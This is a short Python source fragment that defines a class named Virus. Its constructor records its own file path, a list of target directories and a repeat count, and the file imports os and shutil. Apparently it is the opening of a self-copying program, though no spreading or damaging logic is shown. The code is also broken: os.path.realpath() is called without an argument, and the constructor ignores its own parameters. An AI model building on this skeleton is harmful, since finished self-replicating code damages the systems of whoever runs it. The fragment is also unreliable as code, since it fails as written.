import os
import shutil

class Virus:
    def __init__(self,path=None,target_dir=None,repeat=None):
        self.path = path
        self.target_dir = []
        self.repeat = 3
        self.own_path = os.path.realpath()

        
         